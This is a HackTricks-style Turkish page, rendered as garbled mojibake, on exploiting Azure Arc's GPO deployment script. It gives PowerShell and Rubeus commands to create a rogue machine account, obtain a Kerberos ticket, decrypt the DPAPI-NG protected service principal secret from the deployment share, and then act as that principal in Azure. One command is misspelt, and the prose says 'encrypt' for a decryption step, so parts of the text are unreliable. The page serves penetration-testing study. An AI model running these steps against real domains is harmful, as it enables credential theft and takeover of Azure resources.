# Az - Azure Arc KÄ±rÄ±lgan GPO DaÄŸÄ±tma BetiÄŸi

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) ile sÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

- **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na (https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
- [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
- **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
- **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

### SorunlarÄ± TanÄ±mlama

Azure Arc, yeni iÃ§ sunucularÄ±n (katÄ±lmÄ±ÅŸ etki alanÄ± sunucularÄ±) Azure Arc'a Grup Ä°lke Nesnesi yÃ¶ntemiyle entegrasyonuna olanak tanÄ±r. Bu iÅŸlemi kolaylaÅŸtÄ±rmak iÃ§in Microsoft, baÅŸlatma iÅŸlemi iÃ§in gerekli daÄŸÄ±tÄ±m araÃ§larÄ±nÄ± saÄŸlar. ArcEnableServerGroupPolicy.zip dosyasÄ± iÃ§inde DeployGPO.ps1, EnableAzureArc.ps1 ve AzureArcDeployment.psm1 betikleri bulunabilir.

Ã‡alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, DeployGPO.ps1 betiÄŸi aÅŸaÄŸÄ±daki iÅŸlemleri gerÃ§ekleÅŸtirir:

1. Yerel etki alanÄ±nda Azure Arc SunucularÄ± KatÄ±lÄ±mÄ± GPO'sunu oluÅŸturur.
2. Onboarding iÅŸlemi iÃ§in oluÅŸturulan belirli aÄŸ paylaÅŸÄ±mÄ±na EnableAzureArc.ps1 onboarding betiÄŸini kopyalar; bu paylaÅŸÄ±m aynÄ± zamanda Windows yÃ¼kleyici paketini iÃ§erir.

Bu betiÄŸi Ã§alÄ±ÅŸtÄ±rÄ±rken sistem yÃ¶neticilerinin **ServicePrincipalId** ve **ServicePrincipalClientSecret** olmak Ã¼zere iki ana parametreyi saÄŸlamalarÄ± gerekir. AyrÄ±ca, etki alanÄ±, paylaÅŸÄ±mÄ± barÄ±ndÄ±ran sunucunun FQDN'si ve paylaÅŸÄ±m adÄ± gibi diÄŸer parametreler de gereklidir. BetiÄŸe ayrÄ±ca kiracÄ± kimliÄŸi, kaynak grubu ve diÄŸer gerekli bilgiler de saÄŸlanmalÄ±dÄ±r.

DPAPI-NG ÅŸifrelemesi kullanÄ±larak belirtilen paylaÅŸÄ±mdaki AzureArcDeploy dizininde ÅŸifrelenmiÅŸ bir gizli oluÅŸturulur. ÅifrelenmiÅŸ gizli, encryptedServicePrincipalSecret adlÄ± bir dosyada saklanÄ±r. Bu ÅŸifrelemenin, betik yorumlarÄ±nda belirtildiÄŸi gibi, Domain Computer ve Domain Controller grup SIDs'ini iÃ§eren bir tanÄ±mlayÄ±cÄ± ile gerÃ§ekleÅŸtirildiÄŸi DeployGPO.ps1 betiÄŸinde bulunan kanÄ±tlardan anlaÅŸÄ±labilir. Bu, ServicePrincipalSecret'in yalnÄ±zca Etki AlanÄ± Denetleyicileri ve Etki AlanÄ± BilgisayarlarÄ± gÃ¼venlik gruplarÄ± tarafÄ±ndan ÅŸifresinin Ã§Ã¶zÃ¼lebileceÄŸini saÄŸlar.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### SÄ±zma

AÅŸaÄŸÄ±daki koÅŸullara sahibiz:

1. Ä°Ã§ aÄŸÄ± baÅŸarÄ±lÄ± bir ÅŸekilde ele geÃ§irdik.
2. Active Directory iÃ§inde bir bilgisayar hesabÄ± oluÅŸturma veya kontrolÃ¼nÃ¼ ele geÃ§irme yeteneÄŸine sahibiz.
3. AzureArcDeploy dizinini iÃ§eren bir aÄŸ paylaÅŸÄ±mÄ± keÅŸfettik.

Bir AD ortamÄ±nda bir makine hesabÄ± elde etmenin birkaÃ§ yÃ¶ntemi vardÄ±r. En yaygÄ±n olanlardan biri makine hesabÄ± kotasÄ±nÄ± sÃ¶mÃ¼rmektir. BaÅŸka bir yÃ¶ntem, zayÄ±f ACL'ler veya Ã§eÅŸitli diÄŸer yapÄ±landÄ±rmalar aracÄ±lÄ±ÄŸÄ±yla bir makine hesabÄ±nÄ± tehlikeye atmak iÃ§indir.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Bir makine hesabÄ± elde edildiÄŸinde, bu hesap kullanÄ±larak kimlik doÄŸrulamasÄ± yapmak mÃ¼mkÃ¼ndÃ¼r. Ya runas.exe komutunu netonly bayraÄŸÄ± ile kullanabiliriz ya da Rubeus.exe ile bilet geÃ§irme yÃ¶ntemini kullanabiliriz.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Bilgisayar hesabÄ±mÄ±z iÃ§in TGT'nin bellekte saklanmasÄ±yla, aÅŸaÄŸÄ±daki betiÄŸi kullanarak hizmet baÅŸkanÄ± sÄ±rrÄ±nÄ± ÅŸifreleyebiliriz.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternatif olarak, [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG) kullanabiliriz.

Bu noktada, Azure'a baÄŸlanmak iÃ§in gerekli kalan bilgileri ArcInfo.json dosyasÄ±ndan toplayabiliriz. Bu dosya, ÅŸifrelenmiÅŸ Service Principal Secret dosyasÄ±yla aynÄ± aÄŸ paylaÅŸÄ±mÄ±nda saklanmaktadÄ±r. Bu dosya, TenantId, servicePrincipalClientId, ResourceGroup ve daha fazlasÄ± gibi detaylarÄ± iÃ§erir. Bu bilgilerle, etkilenmiÅŸ servis prensibi olarak Azure CLI kullanabiliriz.

## Referanslar

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)
